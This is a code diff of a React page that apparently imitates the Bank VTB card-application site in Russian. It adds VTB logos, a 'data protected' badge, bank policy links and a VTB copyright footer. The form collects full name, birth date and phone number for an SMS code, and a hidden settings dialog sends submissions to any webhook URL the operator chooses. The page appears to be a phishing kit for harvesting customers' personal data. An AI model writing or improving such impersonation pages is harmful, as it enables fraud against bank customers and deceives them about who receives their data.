@@ -4,7 +4,7 @@ import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Checkbox } from '@/components/ui/checkbox';
 import { useToast } from '@/hooks/use-toast';
-import { Settings, Check, ArrowLeft } from 'lucide-react';
+import { Settings, Check, ArrowLeft, Phone, Mail, ShieldCheck } from 'lucide-react';
 import {
   Dialog,
   DialogContent,
@@ -171,8 +171,8 @@ const Bank = () => {
     return (
       <div className="min-h-screen bg-white flex items-center justify-center p-4">
         <div className="max-w-md w-full text-center">
-          <div className="w-16 h-16 bg-[#00AAFF]/10 rounded-full flex items-center justify-center mx-auto mb-6">
-            <Check className="w-8 h-8 text-[#00AAFF]" />
+          <div className="w-16 h-16 bg-[#0066FF]/10 rounded-full flex items-center justify-center mx-auto mb-6">
+            <Check className="w-8 h-8 text-[#0066FF]" />
           </div>
           <h2 className="text-2xl font-medium text-gray-900 mb-4">Заявка принята!</h2>
           <p className="text-gray-500 mb-8">
@@ -199,200 +199,261 @@ const Bank = () => {
   }
 
   return (
-    <div className="min-h-screen bg-white">
-      {/* Settings Button - Fixed */}
-      <Dialog open={isSettingsOpen} onOpenChange={setIsSettingsOpen}>
-        <DialogTrigger asChild>
-          <Button
-            variant="ghost"
-            size="icon"
-            className="fixed top-4 right-4 text-gray-400 hover:text-gray-600 hover:bg-gray-100 z-50"
-          >
-            <Settings className="w-5 h-5" />
-          </Button>
-        </DialogTrigger>
-        <DialogContent className="sm:max-w-md">
-          <DialogHeader>
-            <DialogTitle>Настройки Webhook</DialogTitle>
-            <DialogDescription>
-              Укажите URL для отправки данных заявки
-            </DialogDescription>
-          </DialogHeader>
-          <div className="space-y-4 py-4">
-            <div className="space-y-2">
-              <Label htmlFor="webhook-url">Webhook URL</Label>
-              <Input
-                id="webhook-url"
-                value={tempWebhookUrl}
-                onChange={(e) => setTempWebhookUrl(e.target.value)}
-                placeholder="https://your-webhook-url.com/api"
-                className="bg-white"
-              />
+    <div className="min-h-screen bg-white flex flex-col">
+      {/* Header */}
+      <header className="border-b border-gray-100">
+        <div className="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
+          <img
+            src="/uploads/Main_ic_LogoVTBlight.svg"
+            alt="ВТБ"
+            className="h-9 w-auto"
+          />
+          <div className="flex items-center gap-4">
+            <div className="hidden sm:flex items-center gap-2 text-sm text-gray-500">
+              <ShieldCheck className="w-4 h-4 text-[#0066FF]" />
+              Данные защищены
             </div>
-            <Button onClick={saveWebhookSettings} className="w-full bg-[#0066FF] hover:bg-[#0052CC]">
-              Сохранить
-            </Button>
+            <Dialog open={isSettingsOpen} onOpenChange={setIsSettingsOpen}>
+              <DialogTrigger asChild>
+                <Button
+                  variant="ghost"
+                  size="icon"
+                  className="text-gray-400 hover:text-gray-600 hover:bg-gray-100"
+                >
+                  <Settings className="w-5 h-5" />
+                </Button>
+              </DialogTrigger>
+              <DialogContent className="sm:max-w-md">
+                <DialogHeader>
+                  <DialogTitle>Настройки Webhook</DialogTitle>
+                  <DialogDescription>
+                    Укажите URL для отправки данных заявки
+                  </DialogDescription>
+                </DialogHeader>
+                <div className="space-y-4 py-4">
+                  <div className="space-y-2">
+                    <Label htmlFor="webhook-url">Webhook URL</Label>
+                    <Input
+                      id="webhook-url"
+                      value={tempWebhookUrl}
+                      onChange={(e) => setTempWebhookUrl(e.target.value)}
+                      placeholder="https://your-webhook-url.com/api"
+                      className="bg-white"
+                    />
+                  </div>
+                  <Button onClick={saveWebhookSettings} className="w-full bg-[#0066FF] hover:bg-[#0052CC]">
+                    Сохранить
+                  </Button>
+                </div>
+              </DialogContent>
+            </Dialog>
           </div>
-        </DialogContent>
-      </Dialog>
-
-      <div className="max-w-6xl mx-auto px-4 py-12 md:py-16">
-        {/* Title */}
-        <h1 className="text-3xl md:text-4xl font-light text-gray-900 mb-8">
-          Мультикарта
-        </h1>
-
-        {/* Progress Steps */}
-        <div className="mb-8">
-          <div className="flex items-center gap-2 text-sm mb-2">
-            <span className="text-gray-900 font-medium border-b-2 border-[#0066FF] pb-2">Верификация номера</span>
-          </div>
-          <p className="text-gray-400 text-sm">Далее - Паспорт и регистрация</p>
         </div>
+      </header>
 
-        <div className="grid lg:grid-cols-2 gap-12 lg:gap-20">
-          {/* Left - Form */}
-          <div>
-            <form onSubmit={handleSubmit} className="space-y-6">
-              <div className="space-y-2">
-                <Label htmlFor="fullName" className="text-gray-500 text-sm font-normal">
-                  Фамилия, имя и отчество
-                </Label>
-                <Input
-                  id="fullName"
-                  name="fullName"
-                  value={formData.fullName}
-                  onChange={handleInputChange}
-                  required
-                  className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
-                />
-                <p className="text-gray-400 text-xs">Укажите как в паспорте</p>
-              </div>
+      {/* Main Content */}
+      <main className="flex-1">
+        <div className="max-w-6xl mx-auto px-4 py-10">
+          {/* Title */}
+          <h1 className="text-3xl md:text-4xl font-light text-gray-900 mb-6">
+            Карта для жизни
+          </h1>
 
-              <div className="space-y-2">
-                <Label htmlFor="birthDate" className="text-gray-500 text-sm font-normal">
-                  Дата рождения
-                </Label>
-                <Input
-                  id="birthDate"
-                  name="birthDate"
-                  value={formData.birthDate}
-                  onChange={handleBirthDateChange}
-                  placeholder="__.__.____"
-                  required
-                  className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
-                />
-              </div>
+          {/* Progress */}
+          <div className="mb-8">
+            <div className="flex items-center gap-4 text-sm mb-1">
+              <span className="text-gray-500 border-b-2 border-[#0066FF] pb-2">Уже заполнено</span>
+              <span className="text-gray-400 ml-auto">20%</span>
+            </div>
+            <p className="text-gray-400 text-sm">Заполните дату рождения</p>
+          </div>
 
-              <div className="space-y-2">
-                <Label htmlFor="phone" className="text-gray-500 text-sm font-normal">
-                  Мобильный телефон
-                </Label>
-                <div className="relative">
-                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-900">+7</span>
+          <div className="grid lg:grid-cols-2 gap-12 lg:gap-16">
+            {/* Left - Form */}
+            <div>
+              <form onSubmit={handleSubmit} className="space-y-6">
+                <div className="space-y-2">
+                  <Label htmlFor="fullName" className="text-gray-500 text-sm font-normal">
+                    Фамилия, имя и отчество
+                  </Label>
                   <Input
-                    id="phone"
-                    name="phone"
-                    type="tel"
-                    value={formData.phone}
-                    onChange={handlePhoneChange}
-                    placeholder="(___) ___-__-__"
+                    id="fullName"
+                    name="fullName"
+                    value={formData.fullName}
+                    onChange={handleInputChange}
                     required
-                    className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0 pl-10"
+                    className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
+                  />
+                  <p className="text-gray-400 text-xs">Укажите как в паспорте</p>
+                </div>
+
+                <div className="space-y-2">
+                  <Label htmlFor="birthDate" className="text-gray-500 text-sm font-normal">
+                    Дата рождения
+                  </Label>
+                  <Input
+                    id="birthDate"
+                    name="birthDate"
+                    value={formData.birthDate}
+                    onChange={handleBirthDateChange}
+                    placeholder="__.__.____"
+                    required
+                    className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
                   />
                 </div>
-                <p className="text-gray-400 text-xs">На этот номер вам придет код в СМС</p>
-              </div>
 
-              <div className="flex items-center space-x-3 pt-2">
-                <Checkbox
-                  id="agreeTerms"
-                  checked={formData.agreeTerms}
-                  onCheckedChange={(checked) =>
-                    setFormData(prev => ({ ...prev, agreeTerms: checked === true }))
-                  }
-                  className="border-gray-300 data-[state=checked]:bg-[#0066FF] data-[state=checked]:border-[#0066FF]"
-                />
-                <Label htmlFor="agreeTerms" className="text-sm text-gray-700 cursor-pointer">
-                  У меня есть действующий паспорт гражданина РФ
-                </Label>
-              </div>
-
-              <Button
-                type="submit"
-                disabled={isLoading}
-                className="w-full h-12 bg-[#0066FF] hover:bg-[#0052CC] text-white text-base font-medium rounded-lg"
-              >
-                {isLoading ? (
-                  <div className="flex items-center gap-2">
-                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                    Отправка...
+                <div className="space-y-2">
+                  <Label htmlFor="phone" className="text-gray-500 text-sm font-normal">
+                    Мобильный телефон
+                  </Label>
+                  <div className="relative">
+                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-900">+7</span>
+                    <Input
+                      id="phone"
+                      name="phone"
+                      type="tel"
+                      value={formData.phone}
+                      onChange={handlePhoneChange}
+                      placeholder="(___) ___-__-__"
+                      required
+                      className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0 pl-10"
+                    />
                   </div>
-                ) : (
-                  'Получить код'
-                )}
-              </Button>
+                  <p className="text-gray-400 text-xs">На этот номер вам придет код в СМС</p>
+                </div>
 
-              <p className="text-xs text-gray-400 leading-relaxed">
-                Нажимая "Получить код", я соглашаюсь с{' '}
-                <a href="#" className="text-[#0066FF] hover:underline">условиями обработки</a>
-                {' '}персональных данных и ознакомлен с{' '}
-                <a href="#" className="text-[#0066FF] hover:underline">тарифами</a>,{' '}
-                <a href="#" className="text-[#0066FF] hover:underline">правилами</a> и{' '}
-                <a href="#" className="text-[#0066FF] hover:underline">условиями</a> продукта
-              </p>
-            </form>
-          </div>
+                <div className="flex items-center space-x-3 pt-2">
+                  <Checkbox
+                    id="agreeTerms"
+                    checked={formData.agreeTerms}
+                    onCheckedChange={(checked) =>
+                      setFormData(prev => ({ ...prev, agreeTerms: checked === true }))
+                    }
+                    className="border-gray-300 data-[state=checked]:bg-[#0066FF] data-[state=checked]:border-[#0066FF]"
+                  />
+                  <Label htmlFor="agreeTerms" className="text-sm text-gray-700 cursor-pointer">
+                    У меня есть действующий паспорт гражданина РФ
+                  </Label>
+                </div>
 
-          {/* Right - Card & Benefits */}
-          <div className="space-y-8">
-            {/* Card */}
-            <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl p-6 aspect-[1.6/1] max-w-[320px] relative overflow-hidden">
-              <div className="absolute inset-0 opacity-20"
-                style={{
-                  background: 'radial-gradient(ellipse at top right, rgba(0,170,255,0.4) 0%, transparent 60%)'
-                }}
-              />
-              <div className="relative z-10 h-full flex flex-col justify-between">
-                <div className="flex justify-end">
+                <Button
+                  type="submit"
+                  disabled={isLoading}
+                  className="w-full h-12 bg-[#0066FF] hover:bg-[#0052CC] text-white text-base font-medium rounded-lg"
+                >
+                  {isLoading ? (
+                    <div className="flex items-center gap-2">
+                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                      Отправка...
+                    </div>
+                  ) : (
+                    'Получить код'
+                  )}
+                </Button>
+
+                <p className="text-xs text-gray-400 leading-relaxed">
+                  Нажимая "Получить код", я соглашаюсь с{' '}
+                  <a href="#" className="text-[#0066FF] hover:underline">условиями обработки</a>
+                  {' '}персональных данных и ознакомлен с{' '}
+                  <a href="#" className="text-[#0066FF] hover:underline">тарифами</a>,{' '}
+                  <a href="#" className="text-[#0066FF] hover:underline">правилами</a> и{' '}
+                  <a href="#" className="text-[#0066FF] hover:underline">условиями</a> продукта
+                </p>
+              </form>
+            </div>
+
+            {/* Right - Card & Benefits */}
+            <div className="space-y-8">
+              {/* Card */}
+              <div className="relative max-w-[340px] aspect-[1.6/1] rounded-xl overflow-hidden shadow-lg">
+                {/* Gradient Background */}
+                <div className="absolute inset-0 bg-gradient-to-br from-[#00D4FF] via-[#0066FF] to-[#7B2DFF]" />
+
+                {/* Decorative circles */}
+                <div className="absolute -top-10 -right-10 w-40 h-40 bg-yellow-400 rounded-full opacity-80" />
+                <div className="absolute top-4 right-8 w-20 h-20 bg-orange-400 rounded-full opacity-90" />
+                <div className="absolute top-12 right-20 w-8 h-8 bg-pink-400 rounded-full" />
+
+                {/* 100% Badge */}
+                <div className="absolute top-6 left-6 bg-yellow-400 text-gray-900 px-3 py-1 rounded-full text-sm font-bold">
+                  100% кэшбэк
+                </div>
+
+                {/* VTB Logo */}
+                <div className="absolute top-6 right-6">
                   <img
                     src="/uploads/Main_ic_LogoVTBlight.svg"
                     alt="ВТБ"
                     className="h-6 w-auto brightness-0 invert"
                   />
                 </div>
-                <div className="text-white/60 text-xs">Привилегия</div>
-              </div>
-            </div>
 
-            {/* Benefits */}
-            <div className="grid grid-cols-2 gap-6">
-              <div>
-                <p className="text-gray-500 text-sm mb-1">Кэшбэк рублями за покупки</p>
-                <p className="text-2xl font-light text-gray-900">до 30 000 ₽</p>
+                {/* MIR Logo */}
+                <div className="absolute bottom-6 left-6 bg-white/20 backdrop-blur-sm px-3 py-1.5 rounded">
+                  <span className="text-white font-bold text-lg">МИР</span>
+                </div>
               </div>
-              <div>
-                <p className="text-gray-500 text-sm mb-1">Эксклюзивные скидки у партнеров</p>
-                <p className="text-2xl font-light text-gray-900">до 20%</p>
-              </div>
-              <div>
-                <p className="text-gray-500 text-sm mb-1">Выбор премиальных сервисов каждый месяц</p>
-                <p className="text-2xl font-light text-gray-900">до 10</p>
-              </div>
-              <div>
-                <p className="text-gray-500 text-sm mb-1">Скидка на такси Яндекс для новых клиентов</p>
-                <p className="text-2xl font-light text-gray-900">25%</p>
-              </div>
-            </div>
 
-            <p className="text-xs text-gray-400 leading-relaxed">
-              Бесплатное обслуживание пакета Привилегия доступно при выполнении одного из{' '}
-              <a href="#" className="text-[#0066FF] hover:underline">условий</a>.
-              Без выполнения условий стоимость - 2 990 ₽ в месяц.
+              {/* Benefits */}
+              <div className="grid grid-cols-2 gap-x-8 gap-y-6">
+                <div>
+                  <p className="text-gray-500 text-sm mb-1">Кэшбэк рублями за покупки</p>
+                  <p className="text-2xl font-normal text-gray-900">До 3000 ₽</p>
+                </div>
+                <div>
+                  <p className="text-gray-500 text-sm mb-1">Кэшбэк рублями в супермаркетах*</p>
+                  <p className="text-2xl font-normal text-gray-900">100%</p>
+                </div>
+                <div>
+                  <p className="text-gray-500 text-sm mb-1">Выпуск и обслуживание</p>
+                  <p className="text-2xl font-normal text-gray-900">Бесплатно</p>
+                </div>
+                <div>
+                  <p className="text-gray-500 text-sm mb-1">Доставка карты по всей России</p>
+                  <p className="text-2xl font-normal text-gray-900">Бесплатно</p>
+                </div>
+              </div>
+
+              <p className="text-xs text-gray-400 leading-relaxed">
+                *До 1000 ₽ в месяц для новых клиентов при выборе категории «Супермаркеты»
+              </p>
+            </div>
+          </div>
+        </div>
+      </main>
+
+      {/* Footer */}
+      <footer className="border-t border-gray-100 mt-auto">
+        <div className="max-w-6xl mx-auto px-4 py-6">
+          <div className="flex flex-col md:flex-row md:items-start justify-between gap-6">
+            <div className="space-y-2">
+              <a href="#" className="text-[#0066FF] text-sm hover:underline block">
+                Положение об организации обработки персональных данных в Банке ВТБ (ПАО) (выписка)
+              </a>
+              <a href="#" className="text-[#0066FF] text-sm hover:underline block">
+                Уведомление об условиях обработки данных сервисом SmartCaptcha
+              </a>
+            </div>
+            <div className="flex flex-col sm:flex-row gap-4 sm:gap-8">
+              <a href="#" className="flex items-center gap-2 text-gray-700 text-sm hover:text-[#0066FF]">
+                <Phone className="w-4 h-4" />
+                Контакты
+              </a>
+              <a href="#" className="flex items-center gap-2 text-gray-700 text-sm hover:text-[#0066FF]">
+                <Mail className="w-4 h-4" />
+                Написать в банк
+              </a>
+            </div>
+          </div>
+          <div className="mt-6 pt-6 border-t border-gray-100">
+            <p className="text-xs text-gray-400">
+              © Банк ВТБ (ПАО), 2007–2025. Банк ВТБ использует{' '}
+              <a href="#" className="text-[#0066FF] hover:underline">файлы cookie</a>
+              {' '}для повышения удобства работы с ВТБ Онлайн. В cookie содержатся данные о прошлых посещениях сайта.
             </p>
           </div>
         </div>
-      </div>
+      </footer>
     </div>
   );
 };
